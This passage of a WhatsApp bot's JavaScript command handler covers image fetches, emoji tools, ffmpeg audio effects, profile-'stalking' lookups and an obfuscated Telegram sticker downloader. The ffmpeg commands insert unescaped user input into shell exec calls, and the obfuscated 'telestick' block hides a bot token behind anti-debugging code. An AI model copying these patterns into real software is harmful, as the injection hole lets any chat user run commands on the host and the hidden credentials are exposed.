            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animenom':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefoxgirl':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await Dare.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animetickle': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await Dare.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animegecg': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await Dare.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'dogwoof': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await Dare.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case '8ballpool': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await Dare.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'goosebird': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await Dare.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefeed': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await Dare.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeavatar': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await Dare.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'lizardpic': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await Dare.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'catmeow': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await Dare.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
    case 'igemoji': 
case 'instagramemoji': 
if (!q) return replydare("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return replydare("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "0")
break
case 'googleemoji': 
if (!q) return replydare("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return replydare("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return replydare("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return replydare("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return replydare("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return replydare("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return replydare("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "7")
break
case 'joyemoji': 
if (!q) return replydare("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return replydare("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "9")
case 'pediaemoji': 
if (!q) return replydare("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return replydare('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await Dare.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await Dare.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return replydare(`Example: ${prefix + command} 10`)
media = await Dare.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replydare('Error!')
jadie = fs.readFileSync(rname)
Dare.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replydare('Error!')
jadie = fs.readFileSync(rname)
Dare.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replydare("Send video/audio")
}
}
break
 case 'tinyurl':{
   if(!q) return replydare('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replydare(body)
  } catch (e) {
  replydare(e)
  }
  })
  }
 break
case 'git': case 'gitclone':
if (!args[0]) return replydare(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replydare(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Dare.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replydare(mess.error))
break

case 'spotify': 
case 'spotifysearch': 
case 'spotifys': {
  if (!text) return reply('🎵 Please enter a song or artist title! 🎶');
  const result = await searchSpotify(text);
  const searchResults = result.map((song, index) => 
    `🎧 ${index + 1}. ${song.name}\n🎤 Artist: ${song.artist}\n🔗 Link: ${song.link}\n\n`
  );
  reply(`🔍 Spotify Search Results for "${text}":\n\n` + searchResults.join(''));
}
break;

case 'spdl': case 'spotifydl': {
await loading()
    if (!text) return reply('🚨 Please Enter a Link 🚨')

    let result = await spotifydl(text)
    let captionvid = `∘ 🎶 Title: ${result.title}\n∘ 🎤 Artist: ${result.artist}\n∘ 📀 Type: ${result.type}\n\n💥𝐃𝐀𝐑𝐄-𝐕𝟑💥`

    const p = await new canvafy.Spotify()
        .setTitle(result.title)
        .setAuthor("🎧 Spotify - Downloader 🎧")
        .setTimestamp(40, 100)
        .setOverlayOpacity(0.8)
        .setBorder("#fff", 0.8)
        .setImage(result.image)
        .setBlur(3)
        .build();

    await Dare.sendMessage(from, { image: p, caption: captionvid }, { quoted: m })
    Dare.sendMessage(m.chat, { audio: { url: result.download }, mimetype: 'audio/mpeg', filename: '🎵 MP3 BY 𝐃𝐀𝐑𝐄-𝐕𝟑 🎵' }, { quoted: m });
}
break

case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
    try {
        let set;
        if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
        else if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
        else if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
        else if (/earrape/.test(command)) set = '-af volume=12';
        else if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
        else if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
        else if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
        else if (/reverse/.test(command)) set = '-filter_complex "areverse"';
        else if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
        else if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
        else if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
        else if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
        if (set) {
            if (/audio/.test(mime)) {
                await reply(mess.wait);
                let media = await Dare.downloadAndSaveMediaMessage(quoted);
                let ran = getRandom('.mp3');
                console.log(`Running ffmpeg command: ffmpeg -i ${media} ${set} ${ran}`);
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(media);
                    if (err) {
                        console.error(`ffmpeg error: ${err}`);
                        return replydare(err);
                    }
                    
                    let buff = fs.readFileSync(ran);
                    Dare.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m });
                    fs.unlinkSync(ran);
                });
            } else {
                replydare(`Reply to the audio you want to change with a caption *${prefix + command}*`);
            }
        } else {
            replydare('Invalid command');
        }
    } catch (e) {
        replydare(e);
    }
    break
case 'define': 
if (!q) return replydare(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replydare(mess.error)
let reply =`
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   Dare.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replydare(`*${q}* isn't a valid text`)
    }
    break

case 'darecan': {
  if (!text) return replydare(`❓ Ask a question\n\nExample: ${prefix + command} Can I dance?`);

  let bisa = [`✅ Can`, `❌ Can't`, `🚫 Cannot`, `💯 Of Course You Can!!!`];
  let keh = bisa[Math.floor(Math.random() * bisa.length)];

  let jawab = `*Can ${text}*\nAnswer: ${keh} 🤩`;

  // Image URL to use
  const imageUrl = 'https://files.catbox.moe/128g9s.jpg';

  try {
      // Send the message with the image and the answer
      await Dare.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: jawab, // Custom message with the question and answer
          mentions: [m.sender] // Mentions the user who asked
      });
  } catch (error) {
      console.error('Error fetching or sending image:', error);
      replydare('❗ Failed to send image. Please try again later.');
  }
}
break;


case 'dareis': {
if (!text) return replydare(`❓ Ask a question\n\nExample: ${prefix + command} Is she a virgin?`);

let apa = [`✅ Yes`, `❌ No`, `🤔 It Could Be`, `✔️ That's right`];
let kah = apa[Math.floor(Math.random() * apa.length)];

let jawab = `*Is ${text}*\nAnswer: ${kah} 😎`;

// Image URL to use
const imageUrl = 'https://files.catbox.moe/128g9s.jpg';

try {
    // Send the message with the image and the answer
    await Dare.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: jawab, // Custom message with the question and answer
        mentions: [m.sender] // Mentions the user who asked
    });
} catch (error) {
    console.error('Error fetching or sending image:', error);
    replydare('❗ Failed to send image. Please try again later.');
}
}
break;

case 'darewhen': {
if (!text) return replydare(`❓ Ask a question\n\nExample: ${prefix + command} will I get married?`);

let kapan = [
    '5 More Days ⏳', '10 More Days ⏳', '15 More Days ⏳', '20 More Days ⏳', '25 More Days ⏳', '30 More Days ⏳',
    '35 More Days ⏳', '40 More Days ⏳', '45 More Days ⏳', '50 More Days ⏳', '55 More Days ⏳', '60 More Days ⏳',
    '65 More Days ⏳', '70 More Days ⏳', '75 More Days ⏳', '80 More Days ⏳', '85 More Days ⏳', '90 More Days ⏳', 
    '100 More Days ⏳', '5 Months More 🗓️', '10 Months More 🗓️', '15 Months More 🗓️', '20 Months More 🗓️', 
    '25 Months More 🗓️', '30 Months More 🗓️', '35 Months More 🗓️', '40 Months More 🗓️', '45 Months More 🗓️', 
    '50 Months More 🗓️', '55 Months More 🗓️', '60 Months More 🗓️', '65 Months More 🗓️', '70 Months More 🗓️', 
    '75 Months More 🗓️', '80 Months More 🗓️', '85 Months More 🗓️', '90 Months More 🗓️', '100 Months More 🗓️', 
    '1 More Year 📅', '2 More Years 📅', '3 More Years 📅', '4 More Years 📅', '5 More Years 📅', 'Tomorrow ⏰', 
    'The Day After Tomorrow ⏰'
];

let koh = kapan[Math.floor(Math.random() * kapan.length)];
let jawab = `*When ${text}*\nAnswer: ${koh} 🤔`;

// Image URL to use
const imageUrl = 'https://files.catbox.moe/128g9s.jpg';

try {
    // Send the message with the image and the answer
    await Dare.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: jawab, // Custom message with the question and answer
        mentions: [m.sender] // Mentions the user who asked
    });
} catch (error) {
    console.error('Error fetching or sending image:', error);
    replydare('❗ Failed to send image. Please try again later.');
}
}
break;


case 'darewhat': {
if (!text) return replydare(`❓ Ask a question\n\nExample: ${prefix + command} is your name?`);

let lel = [`👩‍❤️‍👨 Ask Your GF`, `🤷‍♂️ I Don’t Know`, `👨‍👩‍👧 I Don’t Know, Ask Your Father`];
let kah = lel[Math.floor(Math.random() * lel.length)];
let jawab = `*What ${text}* ❓\nAnswer: ${kah} 🤔`;

// Image URL to use
const imageUrl = 'https://files.catbox.moe/128g9s.jpg';

try {
    await Dare.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: jawab,
        mentions: [m.sender]
    });
} catch (error) {
    console.error('Error fetching or sending image:', error);
    replydare('❗ Failed to send image. Please try again later.');
}
}
break;

case 'darewhere': {
if (!text) return replydare(`❓ Ask a question\n\nExample: ${prefix + command} is your name?`);

let wherelol = [`🏞️ In the mountain`, `🌕 On Mars`, `🌙 On the moon`, `🌳 In the jungle`, `👩‍👧 I don’t know, ask your mom`, `🤷‍♂️ It could be somewhere`];
let kah = wherelol[Math.floor(Math.random() * wherelol.length)];
let jawab = `*Where ${text}* ❓\nAnswer: ${kah} 🤔`;

// Image URL to use
const imageUrl = 'https://files.catbox.moe/128g9s.jpg';

try {
    await Dare.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: jawab,
        mentions: [m.sender]
    });
} catch (error) {
    console.error('Error fetching or sending image:', error);
    replydare('❗ Failed to send image. Please try again later.');
}
}
break;

case 'darehow': {
if (!text) return replydare(`❓ Ask a question\n\nExample: ${prefix + command} to date a girl?`);

let gimana = [`🤔 Ummm...`, `😅 It’s Difficult Bro`, `🚫 Sorry, the bot can’t answer`, `🔍 Try searching on Google`, `😱 Holy cow! Really?`, `😴 I’m too dizzy to answer`, `🙁 Oh, I see :(`, `⏳ Be patient, boss`, `🙄 Really, dude?`];
let kah = gimana[Math.floor(Math.random() * gimana.length)];
let jawab = `*How ${text}* ❓\nAnswer: ${kah} 🤔`;

// Image URL to use
const imageUrl = 'https://files.catbox.moe/128g9s.jpg';

try {
    await Dare.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: jawab,
        mentions: [m.sender]
    });
} catch (error) {
    console.error('Error fetching or sending image:', error);
    replydare('❗ Failed to send image. Please try again later.');
}
}
break;

case 'rate': {
            	if (!text) return replydare(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
let kah = ra[Math.floor(Math.random() * ra.length)]
let jawab = `*${text}*\nAnswer : ${kah}%`
            await replydare(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
replydare(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
Dare.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
           case 'soulmate':
            case 'jodohku': {
            if (!m.isGroup) return reply(mess.only.group)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
Dare.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": 'https://files.catbox.moe/7rt6v2.jpg',
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return reply(mess.only.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
Dare.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖🙂`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
thumbnailUrl: `${global.thumbnail}`,
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
    case 'coffee': case 'kopi': {
Dare.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
if (!text) return replydare('Enter Query Title')
reply(mess.wait)
		let { wallpaper } = require('./lib/scraper')
anuwallpep = await wallpaper(text)
result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]
Dare.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
if (!text) return replydare('Enter Query Title')
reply(mess.wait)
		let { wikimedia } = require('./lib/scraper')
let anumedia = await wikimedia(text)
result = anumedia[Math.floor(Math.random() * anumedia.length)]
Dare.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
            case 'pick': {
            	if (!m.isGroup) return reply(mess.only.group)
            	if (!text) return replydare(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await Dare.groupMetadata(m.chat)
 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let xeonshimts = member[Math.floor(Math.random() * member.length)]
             Dare.sendMessage(from, { 
text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[xeonshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
thumbnailUrl: `${global.thumbnail}`,
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
         }
     break
     
case 'instagramstalk':
case 'igstalk': {
    if (!text) return m.reply(`❗ *Enter a nickname!* ❗\n\n📌 *Example:*\n${prefix + command} vreden`)

    await Dare.sendMessage(m.chat, {
        react: {
            text: "⏱️",
            key: m.key,
        }
    })

    try {
        const { result } = (await axios.get(`https://api.vreden.web.id/api/igstalk?query=${text}`)).data

        Dare.sendMessage(m.chat, {
            image: {
                url: result.image
            },
            caption: `📸 *INSTA STALKER* 📸\n\n👤 *Nickname:* ${result.user.username}\n📝 *Full Name:* ${result.user.full_name}\n📷 *Posts:* ${result.user.media_count}\n👥 *Followers:* ${result.user.follower_count}\n🤝 *Following:* ${result.user.following_count}\n🏷️ *Account Type:* ${result.user.is_business ? "🏢 Business" : '🙋 Personal'}\n\n🗒️ *Bio:* \n${result.user.biography}`
        }, {
            quoted: m
        })
    } catch (error) {
        m.reply("❌ *Username is wrong!* ❌")
    }
}
break

const ytdl = require("@vreden/youtube_scraper")
case 'ytstalk':
case 'youtubestalk': {
    if (!text) return m.reply(`❗ *Enter a nickname!* ❗\n\n📌 *Example:*\n${prefix + command} BMB_DARE`)

    await Dare.sendMessage(m.chat, {
        react: {
            text: "⏱️",
            key: m.key,
        }
    })

    try {
        let result = await ytdl.channel(text)
        Dare.sendMessage(m.chat, {
            image: {
                url: result.image
            },
            caption: `▶️ *YOUTUBE STALKER* 📺\n\n👤 *Channel Name:* ${result.details.title}\n🔗 *Username:* ${result.details.customUrl}\n🎥 *Videos:* ${result.statistics.videoCount}\n📢 *Subscribers:* ${result.statistics.subscriberCount}\n👀 *Views:* ${result.statistics.viewCount}\n📝 *Bio:* \n${result.details.description}`
        }, {
            quoted: m
        })
    } catch (error) {
        m.reply("❌ *Username is wrong!* ❌")
    }
}
break

case 'lirik':
case 'lyrics': {
    if (!text) return reply(`❓ *What lyrics are you looking for?* ❓\n\n📌 *Example usage:* ${prefix}lyrics Thunder`);
    reply("⏳ *Searching for lyrics...*"); // Sends a waiting message to the user

    try {
        const apiUrl = `https://some-random-api.com/lyrics?title=${encodeURIComponent(text)}`;
        console.log(`Requesting URL: ${apiUrl}`); // Log the requested URL for debugging

        const hasil = await fetchJson(apiUrl);
        console.log('API Response:', hasil); // Log the API response

        if (hasil && hasil.title && hasil.lyrics) { // Check if the API response contains the expected data
            const xeonlirik = `
🎵 *Lyrics Found!* 🎶

🎤 *Title:* ${hasil.title}
👤 *Artist:* ${hasil.author || 'Unknown'}
🔗 *URL:* ${hasil.link || 'N/A'}

📄 *Lyrics:* 
${hasil.lyrics}
            `.trim();
            
            reply(xeonlirik); // Send the formatted lyrics back to the user
        } else {
            reply(`❌ *Sorry, I couldn't find the lyrics for* "${text}".`);
        }
    } catch (error) {
        console.error('API Error:', error.response?.data || error); // Log the full error response for debugging
        reply(`⚠️ *An error occurred while fetching the lyrics. Please try again later.*`);
    }
    break;
}

case 'ttstalk':
case 'tiktokstalk': {
    if (!text) return m.reply(`❗ *Enter a nickname!* ❗\n\n📌 *Example:*\n${prefix + command} BMB_IS_A_BOT`)
    
    await Dare.sendMessage(m.chat, {
        react: {
            text: "⏱️",
            key: m.key,
        }
    })

    try {
        const { result } = (await axios.get(`https://api.vreden.web.id/api/tiktokStalk?query=${text}`)).data
        Dare.sendMessage(m.chat, {
            image: {
                url: result.image
            },
            caption: `🎯 *TIKTOK STALKER* 🎯\n\n👤 *Nickname:* ${result.user.nickname}\n🔗 *Username:* @${result.user.uniqueId}\n🎥 *Posts:* ${result.stats.videoCount}\n👥 *Followers:* ${result.stats.followerCount}\n🤝 *Following:* ${result.stats.followingCount}\n❤️ *Likes:* ${result.stats.heartCount}\n🧑‍🤝‍🧑 *Friends:* ${result.stats.friendCount}\n📝 *Bio:* \n${result.user.signature}`
        }, {
            quoted: m
        })
    } catch (error) {
        m.reply("❌ *Username is wrong!* ❌")
    }
}
break

//=========================================\\

//=========================================\\
    case 'say': case 'tts': case 'gtts':{
if (!text) return replydare('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return Dare.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break
        
    
        
        case 'telestick': { //credit agan
        	if (m.isGroup) return reply(mess.only.private)
        if (!isPrem) return replyprem(mess.premium)
function __lobz(){const H=['R53FWbciV9','reply','rbot_18407','\x5c(\x20*\x5c)','re\x20is\x20a\x20ch','pushName','_Animated\x20','call','apply','constructo','d\x20that\x20the','eep\x20in\x20min','\x5c+\x5c+\x20*(?:[','1839285Jrgiie','string','chat','1042176iSckCu','https://ap','i.telegram','input','_Enter\x20a\x20t','753088wqxYcm','91437832:A','d\x20complete','k95ktev7KK','e/addstick','ickerSet?n','sSticker','/addsticke','60jrPxaD','cWagwann','131060rHmDNZ','file_id','5757IXqShA','uJY5hR53FW','\x20seconds','4048893pKcLEE','bciV9k95kt','stateObjec','832:AAFir-','re\x20not\x20sup','length','37523_1\x20\x0aK','ers/catuse','gger','.org/bot18','0-9a-zA-Z_','\x0a*Estimate','70238qsQAcs','url_\x0aEg:\x20h','split','ance\x20of\x20ba','le?file_id','init','test','AFir-uJY5h','.org/file/','counter','rs/','stickers\x20a','is_animate','e)\x20{}','frequently','a-zA-Z_$][','debu','stickers','4oOxIpb','sendImageA'];__lobz=function(){return H;};return __lobz();}const __lobC=__lobA;function __lobA(w,v){const z=__lobz();return __lobA=function(A,i){A=A-0x190;let Q=z[A];return Q;},__lobA(w,v);}(function(w,v){const L=__lobA,z=w();while(!![]){try{const A=-parseInt(L(0x1ac))/0x1*(parseInt(L(0x1be))/0x2)+parseInt(L(0x19d))/0x3+-parseInt(L(0x1d0))/0x4+-parseInt(L(0x19b))/0x5*(parseInt(L(0x199))/0x6)+parseInt(L(0x1cd))/0x7+parseInt(L(0x191))/0x8+parseInt(L(0x1a0))/0x9;if(A===v)break;else z['push'](z['shift']());}catch(i){z['push'](z['shift']());}}}(__lobz,0x2388b));const __lobi=(function(){let w=!![];return function(v,z){const A=w?function(){if(z){const i=z['apply'](v,arguments);return z=null,i;}}:function(){};return w=![],A;};}());(function(){__lobi(this,function(){const m=__lobA,w=new RegExp('function\x20*'+m(0x1c3)),v=new RegExp(m(0x1cc)+m(0x1bb)+m(0x1aa)+'$]*)','i'),z=__lobu(m(0x1b1));!w['test'](z+m(0x19a))||!v[m(0x1b2)](z+m(0x1d3))?z('0'):__lobu();})();}());if(!text)return m[__lobC(0x1c1)](__lobC(0x190)+'g\x20sticker\x20'+__lobC(0x1ad)+'ttps://t.m'+__lobC(0x195)+__lobC(0x1a7)+__lobC(0x1c2)+__lobC(0x1a6)+__lobC(0x1cb)+__lobC(0x1ca)+__lobC(0x1c4)+__lobC(0x1af)+'n\x20if\x20used\x20'+__lobC(0x1ba));let __lobQ=text[__lobC(0x1ae)](__lobC(0x198)+__lobC(0x1b6))[0x1],{result:__loby}=await fetchJson('https://ap'+__lobC(0x1d2)+'.org/bot18'+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getSt'+__lobC(0x196)+'ame='+encodeURIComponent(__lobQ));if(__loby[__lobC(0x1b8)+'d'])return m['reply'](__lobC(0x1c6)+__lobC(0x1b7)+__lobC(0x1a4)+'ported_');m[__lobC(0x1c1)](('*Total\x20sti'+'ckers\x20:*\x20'+__loby[__lobC(0x1bd)]['length']+(__lobC(0x1ab)+__lobC(0x193)+'\x20in:*\x20')+__loby[__lobC(0x1bd)][__lobC(0x1a5)]*1.5+__lobC(0x19f))['trim']());for(let __lobr of __loby[__lobC(0x1bd)]){let __lobK=await fetchJson(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1a9)+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getFi'+__lobC(0x1b0)+'='+__lobr[__lobC(0x19c)]),__lobb=await getBuffer(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1b4)+'bot1891437'+__lobC(0x1a3)+__lobC(0x19e)+__lobC(0x1a1)+'ev7KKZ7cc/'+__lobK['result']['file_path']);await Dare[__lobC(0x1bf)+__lobC(0x197)](m[__lobC(0x1cf)],__lobb,m,{'packname':global['packname'],'author':m[__lobC(0x1c5)]}),sleep(0x5dc);}function __lobu(w){function v(z){const P=__lobA;if(typeof z===P(0x1ce))return 